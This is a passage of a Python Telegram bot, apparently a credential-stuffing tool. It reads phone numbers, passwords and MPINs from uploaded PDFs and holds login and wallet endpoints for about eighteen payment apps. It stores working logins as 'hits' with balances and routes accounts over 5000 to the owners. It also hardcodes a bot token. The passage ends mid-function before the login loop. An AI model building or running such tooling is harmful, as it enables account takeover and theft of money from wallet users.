# ==================== PACKAGE CHECK ====================
REQUIRED_PACKAGES = {
    "telegram": "python-telegram-bot",
    "aiohttp": "aiohttp",
    "PyPDF2": "PyPDF2",
    "reportlab": "reportlab",
    "pdfplumber": "pdfplumber",
}

missing = []
for module, package in REQUIRED_PACKAGES.items():
    try:
        __import__(module)
    except ImportError:
        missing.append(package)

if missing:
    print("=" * 60)
    print(" ❌ MISSING PACKAGES DETECTED!")
    print("=" * 60)
    print("\n Install these packages first:\n")
    print(" pip install " + " ".join(missing))
    print("\n (Optional but recommended: pip install PyMuPDF)")
    print("\n" + "=" * 60)
    import sys
    sys.exit(1)

# ==================== IMPORTS ====================
import io
import re
import json
import csv
import sqlite3
import asyncio
import hashlib
import traceback
import os
import random
from datetime import datetime
from pathlib import Path
import urllib.parse
import PyPDF2
import aiohttp
import pdfplumber
try:
    import fitz  # PyMuPDF (optional)
    PYMUPDF_AVAILABLE = True
except ImportError:
    PYMUPDF_AVAILABLE = False
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, PageBreak
from reportlab.lib import colors
from reportlab.lib.units import inch
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# ==================== CONFIGURATION ====================
BOT_TOKEN =  "9023662554:AAEHizeLAGK7UXaVejkyvF2EGCr-CAyiBTc"

OWNER_ID = 8351204457
OWNER_ID_2 = 7099582070
OWNER_IDS = (OWNER_ID, OWNER_ID_2)

def is_owner(user_id):
    try:
        return int(user_id) in OWNER_IDS
    except:
        return False

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_database.db")

WAITING_FOR_PDF = 2

user_data_store = {}
user_tasks = {}

FIXED_DELAY = 3
BALANCE_BOUNDARY = 5000 # 5000 se upar wale owner ko jayenge

# PDF acceptance: agar 30%+ rows valid hain to PDF accept
MIN_VALID_RATIO = 0.30

# ==================== DEFAULT APIs ====================
DEFAULT_APIS = {
    "penguinpay": {
        "name": "PenguinPay",
        "login_url": "https://api.penguinpay-app.com/app/auth/login",
        "wallet_url": "https://api.penguinpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.penguinpay-app.com",
        "referer": "https://app-web.penguinpay-app.com/",
    },
    "showpay": {
        "name": "ShowPay",
        "login_url": "https://api.showpay-web.com/app/auth/login",
        "wallet_url": "https://api.showpay-web.com/app/user/account/wallet",
        "origin": "https://app-web.showpay-web.com",
        "referer": "https://app-web.showpay-web.com/",
    },
    "atg": {
        "name": "ATG",
        "login_url": "https://api.atg-game.com/app/auth/login",
        "wallet_url": "https://api.atg-game.com/app/user/account/wallet",
        "origin": "https://app-web.atg-game.com",
        "referer": "https://app-web.atg-game.com",
    },
    "rs": {
        "name": "RS",
        "login_url": "https://api.rswallet-api.com/app/auth/login",
        "wallet_url": "https://api.rswallet-api.com/app/user/account/wallet",
        "origin": "https://app-web.rswallet-api.com",
        "referer": "https://app-web.rswallet-api.com",
    },
    "swift": {
        "name": "Swift",
        "login_url": "https://api-v2.swiftpay-app.com/app/auth/login",
        "wallet_url": "https://api-v2.swiftpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.swiftpay-app.com",
        "referer": "https://app-web.swiftpay-app.com",
    },
    "miller": {
        "name": "Miller",
        "login_url": "https://api.millerpay-app.com/app/auth/login",
        "wallet_url": "https://api.millerpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.millerpay-app.com",
        "referer": "https://app-web.millerpay-app.com",
    },
    "top": {
        "name": "Top",
        "login_url": "https://api.toppay-web.com/app/auth/login",
        "wallet_url": "https://api.toppay-web.com/app/user/account/wallet",
        "origin": "https://app.toppay-web.com",
        "referer": "https://app.toppay-web.com/",
    },
    "smart": {
        "name": "Smart",
        "login_url": "https://api.smartwallet-app.com/app/auth/login",
        "wallet_url": "https://api.smartwallet-app.com/app/user/account",
        "origin": "https://app-web.smartwallet-app.com",
        "referer": "https://app-web.smartwallet-app.com",
    },
    "east": {
        "name": "East",
        "login_url": "https://api.eastpay-wallet.com/app/auth/login",
        "wallet_url": "https://api.eastpay-wallet.com/app/user/account/wallet",
        "origin": "https://app-web.eastpay-wallet.com",
        "referer": "https://app-web.eastpay-wallet.com",
    },
    "paysetu": {
        "name": "Paysetu",
        "login_url": "https://api.paysetu-app.com/app/auth/login",
        "wallet_url": "https://api.paysetu-app.com/app/user/account/wallet",
        "origin": "https://app-web.paysetu-app.com",
        "referer": "https://app-web.paysetu-app.com/login",
    },
    "autumn": {
        "name": "Autumn",
        "login_url": "https://api.masalape.com/app/auth/login",
        "wallet_url": "https://api.masalape.com/app/user/account/wallet",
        "origin": "https://app-web.autumnpe.com",
        "referer": "https://app-web.autumnpe.com/login?code=farnmoneyn5t",
    },
    "da7": {
        "name": "DA7",
        "login_url": "https://api.da7pay-api.com/app/auth/login",
        "wallet_url": "https://api.da7pay-api.com/app/user/account/wallet",
        "origin": "https://app-web.da7pay.com",
        "referer": "https://app-web.da7pay.com/login",
    },
    "mobius": {
        "name": "Mobius",
        "login_url": "https://api.mobiuspe-app.com/app/auth/login",
        "wallet_url": "https://api.mobiuspe-app.com/app/user/account/wallet",
        "origin": "https://app-web.mobiuspe-app.com",
        "referer": "https://app-web.mobiuspe-app.com/login?code=earnmoney4gb",
    },
    "tata": {
        "name": "Tata",
        "login_url": "https://api.tatapay-web.com/app/auth/login",
        "wallet_url": "https://api.tatapay-web.com/app/user/account/wallet",
        "origin": "https://app-web.tatapay-web.com",
        "referer": "https://app-web.tatapay-web.com/login?code=0dashowpa4ry",
    },
    "o": {
        "name": "O",
        "login_url": "https://api.opay-app.com/app/auth/login",
        "wallet_url": "https://api.opay-app.com/app/user/account/wallet",
        "origin": "https://app-web.opay-app.com",
        "referer": "https://app-web.opay-app.com/login",
    },
    "shark": {
        "name": "Shark",
        "login_url": "https://api.sharkpay-app.com/app/auth/login",
        "wallet_url": "https://api.sharkpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.sharkpay-app.com",
        "referer": "https://app-web.sharkpay-app.com/login",
    },
    "ola": {
        "name": "Ola",
        "login_url": "https://api.app-olapay.com/app/auth/login",
        "wallet_url": "https://api.app-olapay.com/app/user/account/wallet",
        "origin": "https://app-web.app-olapay.com",
        "referer": "https://app-web.app-olapay.com/login",
    },
    "hoyo": {
        "name": "Hoyo",
        "login_url": "https://api.hoyopay-app.com/app/auth/login",
        "wallet_url": "https://api.hoyopay-app.com/app/user/account/wallet",
        "origin": "https://app-web.hoyopay-app.com",
        "referer": "https://app-web.hoyopay-app.com/login",
    },
}

# ==================== DATABASE ====================
def init_database():
    db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_database.db")
    conn = sqlite3.connect(db_path)
    c = conn.cursor()

    c.execute("""CREATE TABLE IF NOT EXISTS users ( user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, status TEXT DEFAULT 'pending', request_time DATETIME, approved_time DATETIME, updated_at DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    c.execute("""CREATE TABLE IF NOT EXISTS chat_history ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, first_name TEXT, last_name TEXT, message_type TEXT, message_content TEXT, file_name TEXT, api_url TEXT, api_name TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    c.execute("""CREATE TABLE IF NOT EXISTS user_pdfs ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, file_name TEXT, file_path TEXT, num_accounts INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    try:
        c.execute("SELECT file_path FROM user_pdfs LIMIT 1")
    except sqlite3.OperationalError:
        print(" 🔄 Migrating user_pdfs table: adding file_path column...")
        c.execute("ALTER TABLE user_pdfs ADD COLUMN file_path TEXT")
        conn.commit()
        print(" ✅ Migration complete!")

    c.execute("""CREATE TABLE IF NOT EXISTS user_apis ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_key TEXT, api_name TEXT, login_url TEXT, wallet_url TEXT, origin TEXT, referer TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    c.execute("""CREATE TABLE IF NOT EXISTS checkpoints ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_key TEXT, api_name TEXT, last_index INTEGER, total INTEGER, hits INTEGER, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    c.execute("""CREATE TABLE IF NOT EXISTS hits ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_key TEXT, api_name TEXT, phone TEXT, password TEXT, balance TEXT, user_id_val TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    c.execute("""CREATE TABLE IF NOT EXISTS high_hits ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_key TEXT, api_name TEXT, phone TEXT, password TEXT, balance TEXT, user_id_val TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP )""")

    conn.commit()
    conn.close()
    print("Database initialized")

# ==================== USER MANAGEMENT ====================
def get_user_status(user_id):
    if is_owner(user_id):
        return "owner"
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else "new"

def ensure_user_recorded(user_id, username, first_name, last_name):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
        if c.fetchone() is None:
            c.execute("""INSERT INTO users (user_id, username, first_name, last_name, status, request_time, approved_time) VALUES (?,?,?,?,?,?,?)""",
                      (user_id, username, first_name, last_name, "approved", datetime.now(), datetime.now()))
            conn.commit()
            print(f" ➕ New user recorded: {user_id} (@{username})")
        conn.close()
    except Exception as e:
        print(f"ensure_user_recorded error: {e}")

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""SELECT user_id, username, first_name, last_name, approved_time FROM users ORDER BY approved_time DESC""")
    rows = c.fetchall()
    conn.close()
    return rows

def get_user_stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""SELECT u.user_id, u.username, u.first_name, (SELECT COUNT(*) FROM user_pdfs WHERE user_id=u.user_id) as pdf_count, (SELECT COUNT(*) FROM user_apis WHERE user_id=u.user_id) as api_count FROM users u""")
    rows = c.fetchall()
    conn.close()
    return rows

def save_user_pdf(user_id, username, file_name, num_accounts, pdf_bytes):
    try:
        save_dir = os.path.join(os.path.dirname(DB_PATH), "saved_pdfs")
        os.makedirs(save_dir, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', file_name)
        save_name = f"{user_id}_{timestamp}_{safe_name}"
        file_path = os.path.join(save_dir, save_name)

        with open(file_path, "wb") as f:
            f.write(pdf_bytes)

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO user_pdfs (user_id, username, file_name, file_path, num_accounts) VALUES (?,?,?,?,?)",
                  (user_id, username, file_name, file_path, num_accounts))
        conn.commit()
        conn.close()
        return file_path
    except Exception as e:
        print(f"❌ save_user_pdf error: {e}")
        return None

def get_user_pdfs_list(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT file_name, file_path, num_accounts, timestamp FROM user_pdfs WHERE user_id=? ORDER BY timestamp DESC", (user_id,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"DB error (get_user_pdfs_list): {e}")
        return []

def get_user_apis_list(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT api_key, api_name, login_url, wallet_url, origin, referer, timestamp FROM user_apis WHERE user_id=? ORDER BY timestamp DESC", (user_id,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"DB error (get_user_apis_list): {e}")
        return []

# ==================== PER-USER APIs ====================
def load_user_apis(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT api_key, api_name, login_url, wallet_url, origin, referer FROM user_apis WHERE user_id=?", (user_id,))
    rows = c.fetchall()
    conn.close()
    apis = {}
    for row in rows:
        apis[row[0]] = {
            "name": row[1],
            "login_url": row[2],
            "wallet_url": row[3],
            "origin": row[4],
            "referer": row[5],
        }
    return apis

def save_user_api(user_id, api_key, api_data):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM user_apis WHERE user_id=? AND api_key=?", (user_id, api_key))
    c.execute("""INSERT INTO user_apis (user_id, api_key, api_name, login_url, wallet_url, origin, referer) VALUES (?,?,?,?,?,?,?)""",
              (user_id, api_key, api_data["name"], api_data["login_url"],
               api_data["wallet_url"], api_data["origin"], api_data["referer"]))
    conn.commit()
    conn.close()

def delete_user_api(user_id, api_key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM user_apis WHERE user_id=? AND api_key=?", (user_id, api_key))
    conn.commit()
    conn.close()

def get_user_apis(user_id):
    apis = dict(DEFAULT_APIS)
    custom = load_user_apis(user_id)
    apis.update(custom)
    return apis

# ==================== CHECKPOINTS & HITS ====================
def save_checkpoint(user_id, api_key, api_name, last_index, total, hits, status):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM checkpoints WHERE user_id=? AND api_key=?", (user_id, api_key))
        conn.execute("""INSERT INTO checkpoints (user_id, api_key, api_name, last_index, total, hits, status) VALUES (?,?,?,?,?,?,?)""",
                     (user_id, api_key, api_name, last_index, total, hits, status))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Checkpoint save error: {e}")

def save_hit(user_id, api_key, api_name, phone, password, balance, user_id_val):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""INSERT INTO hits (user_id, api_key, api_name, phone, password, balance, user_id_val) VALUES (?,?,?,?,?,?,?)""",
                     (user_id, api_key, api_name, phone, password, balance, user_id_val))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Hit save error: {e}")

def get_hits_for_api(user_id, api_key):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT phone, password, balance, user_id_val FROM hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        rows = c.fetchall()
        conn.close()
        return [{"phone": r[0], "password": r[1], "balance": r[2], "user_id": r[3]} for r in rows]
    except:
        return []

def clear_hits(user_id, api_key=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        if api_key:
            conn.execute("DELETE FROM hits WHERE user_id=? AND api_key=?", (user_id, api_key))
            conn.execute("DELETE FROM high_hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        else:
            conn.execute("DELETE FROM hits WHERE user_id=?", (user_id,))
            conn.execute("DELETE FROM high_hits WHERE user_id=?", (user_id,))
        conn.execute("DELETE FROM checkpoints WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Clear hits error: {e}")

def save_high_hit(user_id, api_key, api_name, phone, password, balance, user_id_val):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""INSERT INTO high_hits (user_id, api_key, api_name, phone, password, balance, user_id_val) VALUES (?,?,?,?,?,?,?)""",
                     (user_id, api_key, api_name, phone, password, balance, user_id_val))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"High hit save error: {e}")

def get_high_hits_for_api(user_id, api_key):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT phone, password, balance, user_id_val FROM high_hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        rows = c.fetchall()
        conn.close()
        return [{"phone": r[0], "password": r[1], "balance": r[2], "user_id": r[3]} for r in rows]
    except:
        return []

# ==================== HELPERS ====================
def clean_string(text):
    if not text:
        return text
    text = str(text).strip()
    if text.startswith("'"):
        text = text[1:]
    if text.endswith("'"):
        text = text[:-1]
    return text.strip()

def clean_phone(phone_str):
    phone_str = clean_string(phone_str)
    if not phone_str:
        return None
    digits = re.sub(r"\D", "", str(phone_str))
    if len(digits) == 12 and digits.startswith("91"):
        return digits[2:]
    if len(digits) == 10:
        return digits
    if len(digits) > 10:
        return digits[-10:]
    return None

def clean_password(password_str):
    return clean_string(password_str)

def escape_md(text):
    if not text:
        return ""
    text = str(text)
    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
        text = text.replace(ch, '\\' + ch)
    return text


# ============================================================
# ============ CASCADING PDF PARSER (5 METHODS) ==============
# ============================================================

def _validate_row(phone_str, password_str, mpin_str):
    """Validate single row. Return dict if valid, else None."""
    phone_clean = clean_phone(phone_str)
    if not phone_clean:
        return None
    if not re.fullmatch(r"\d{6}", (mpin_str or "").strip()):
        return None
    password = clean_password(password_str)
    if not password:
        return None
    # MPIN is now returned as 'pin' so it can be verified later
    return {"phone": phone_clean, "password": password, "pin": mpin_str.strip()}


def _is_header(cells):
    """Detect header row"""
    if not cells:
        return False
    first = str(cells[0]).lower()
    return ("mobile" in first) or ("phone" in first) or ("number" in first)


def _method_1_pdfplumber_tables(pdf_bytes):
    
